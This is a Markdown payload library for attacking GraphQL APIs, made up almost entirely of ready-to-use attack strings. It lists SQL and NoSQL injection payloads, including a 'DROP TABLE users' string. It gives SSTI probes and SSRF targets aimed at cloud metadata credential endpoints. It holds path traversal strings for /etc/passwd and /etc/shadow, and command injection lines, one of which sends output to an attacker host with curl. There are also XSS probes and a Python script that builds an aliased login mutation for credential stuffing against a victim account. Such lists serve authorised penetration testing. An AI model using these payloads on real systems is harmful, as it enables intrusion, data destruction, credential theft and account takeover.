# GraphQL Payload Library

## SQLi Payloads (String args)
```
' OR '1'='1
' OR 1=1--
1' ORDER BY 1--
1 UNION SELECT null,table_name FROM information_schema.tables--
'; DROP TABLE users;--
' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--
```

## NoSQL Injection (MongoDB)
```json
{"$gt": ""}
{"$regex": ".*"}
{"$where": "this.password.length > 0"}
{"$ne": null}
```
In GraphQL argument: `filter: {password: {$regex: ".*"}}`

## SSTI Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{config}}
{{self.__dict__}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

## SSRF Targets
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:9200/  (Elasticsearch)
file:///etc/passwd
file:///proc/self/environ
```

## Path Traversal
```
../../../etc/passwd
../../etc/shadow
..%2F..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
%252e%252e%252fetc%252fpasswd
```

## OS Command Injection
```
; id
; whoami
`id`
$(id)
| id
& id
|| id
; cat /etc/passwd
; curl http://attacker.com/$(id)
```

## XSS (reflected in errors)
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
```

## Alias Batch Template (credential stuffing)
Generate with:
```python
passwords = open("rockyou.txt").read().splitlines()[:100]
aliases = "\n".join(f'  a{i}: login(email:"victim@example.com", password:"{p}") {{ token }}' for i,p in enumerate(passwords))
print(f"mutation {{\n{aliases}\n}}")
```
